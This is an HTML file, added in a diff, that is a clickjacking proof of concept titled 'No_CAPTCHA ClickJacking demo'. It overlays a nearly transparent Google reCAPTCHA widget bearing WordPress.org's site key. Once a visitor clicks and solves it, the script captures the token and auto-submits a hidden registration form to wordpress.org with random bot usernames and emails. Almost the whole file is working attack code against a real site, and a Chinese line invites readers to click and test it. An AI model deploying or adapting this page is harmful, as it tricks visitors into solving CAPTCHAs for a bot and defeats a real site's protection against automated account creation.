@@ -1,0 +1,38 @@
+<html>
+    <head>
+        <title>No_CAPTCHA ClickJacking demo</title>
+        <meta name="referrer" content="never">
+		<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?ver=2'></script>
+	</head>
+    <body>
+    <form method="post" action="https://wordpress.org/support/register.php">
+    <div style="opacity:0.1" class="g-recaptcha" data-sitekey="6Ld6gcoSAAAAAEkCxPeS-_sqEokNIHwNCOtx17xo"></div>
+    <input name="user_login" type="hidden" id="user_login" size="30" maxlength="30" value="" />
+    <input name="user_email" id="user_email" type="hidden" value="" />
+    </form>  
+	半透明为了更好的展示，点击测试攻击。
+    <script>
+        function makeid()
+        {
+            var text = "";
+            var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        
+            for( var i=0; i < 7; i++ )
+                text += possible.charAt(Math.floor(Math.random() * possible.length));
+        
+            return text;
+        }
+        user_login.value='BOT-'+makeid();
+        user_email.value='BOT-'+makeid()+'@gmail.com';
+        
+        check = setInterval(function(){
+          v=document.getElementById('g-recaptcha-response').value
+          if(v.length>0){
+            alert('Thanks for helping my bot! Your token is '+v);
+            document.forms[0].submit();
+            clearInterval(check);
+          }
+        },400)
+    </script>
+    </body>
+</html>
